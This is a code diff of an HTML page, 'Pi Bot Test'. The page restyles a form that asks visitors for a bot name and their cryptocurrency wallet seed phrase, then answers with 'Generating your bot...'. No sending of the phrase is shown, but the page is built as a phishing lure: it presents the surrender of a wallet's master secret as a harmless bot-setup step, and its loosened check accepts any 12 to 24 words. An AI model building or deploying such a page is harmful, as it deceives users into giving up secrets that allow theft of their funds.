@@ -5,63 +5,78 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pi Bot Test</title>
     <style>
+        /* General Styles */
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             background-color: #121212;
             color: white;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
+
         h1 {
-            color: #00ff99;
+            margin-top: 20px;
         }
-        form {
+
+        p {
+            color: #bbb;
+        }
+
+        /* Form */
+        .form-container {
             background: #1e1e1e;
             padding: 20px;
             border-radius: 10px;
-            width: 300px;
-            margin: 0 auto;
-            box-shadow: 0 0 10px rgba(0, 255, 153, 0.5);
+            width: 90%;
+            max-width: 400px;
+            margin: 20px auto;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
         }
+
         label {
             display: block;
             margin-top: 10px;
+            font-size: 16px;
         }
+
         input, textarea {
             width: 100%;
             padding: 10px;
             margin-top: 5px;
             border: none;
             border-radius: 5px;
+            font-size: 14px;
             background: #333;
             color: white;
         }
+
         button {
+            width: 100%;
             margin-top: 15px;
             padding: 10px;
-            background-color: #00ff99;
-            color: black;
+            background-color: #007bff;
             border: none;
-            cursor: pointer;
+            color: white;
             font-size: 16px;
             border-radius: 5px;
+            cursor: pointer;
         }
+
         button:hover {
-            background-color: #00cc77;
+            background-color: #0056b3;
         }
+
         .message {
             margin-top: 10px;
-            font-size: 16px;
+            font-size: 14px;
         }
+
         a {
             display: block;
-            margin-top: 15px;
-            color: #00ff99;
+            margin-top: 20px;
+            color: #00bcd4;
             text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
@@ -69,45 +84,34 @@
     <h1>Test Your Pi Bot Here</h1>
     <p>Enter your details below:</p>
 
-    <form id="botForm">
-        <label for="botName">Preferred Name of Your Bot:</label>
-        <input type="text" id="botName" required>
+    <div class="form-container">
+        <label for="bot-name">Preferred Name of Your Bot:</label>
+        <input type="text" id="bot-name" required>
 
-        <label for="seedPhrase">Enter Your Wallet Seed Phrase:</label>
-        <textarea id="seedPhrase" rows="3" required></textarea>
+        <label for="seed-phrase">Enter Your Wallet Seed Phrase:</label>
+        <textarea id="seed-phrase" rows="3" placeholder="Enter your seed phrase here..." required></textarea>
 
-        <button type="submit">Submit</button>
-        <p id="message" class="message"></p>
-    </form>
+        <button onclick="validateSeedPhrase()">Submit</button>
+
+        <p id="response-message" class="message"></p>
+    </div>
 
     <a href="index.html">Back to Home</a>
 
     <script>
-        const bip39Words = new Set([
-            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", 
-            "absurd", "abuse", "access", "accident", /* Include all 2048 BIP39 words here */
-        ]);
+        function validateSeedPhrase() {
+            const seedInput = document.getElementById("seed-phrase").value.trim();
+            const words = seedInput.split(/\s+/);
+            const messageElement = document.getElementById("response-message");
 
-        document.getElementById("botForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            const seedPhrase = document.getElementById("seedPhrase").value.trim().toLowerCase();
-            const words = seedPhrase.split(/\s+/);
-            const message = document.getElementById("message");
-
-            if (words.length !== 12 && words.length !== 24) {
-                message.innerHTML = "Seed phrase incorrect.";
-                message.style.color = "red";
-                return;
-            }
-
-            if (words.every(word => bip39Words.has(word))) {
-                message.innerHTML = "Generating your bot...";
-                message.style.color = "lime";
+            if (words.length >= 12 && words.length <= 24) {
+                messageElement.style.color = "lightgreen";
+                messageElement.textContent = "Generating your bot...";
             } else {
-                message.innerHTML = "Seed phrase incorrect.";
-                message.style.color = "red";
+                messageElement.style.color = "red";
+                messageElement.textContent = "Seed phrase incorrect!";
             }
-        });
+        }
     </script>
 </body>
 </html>
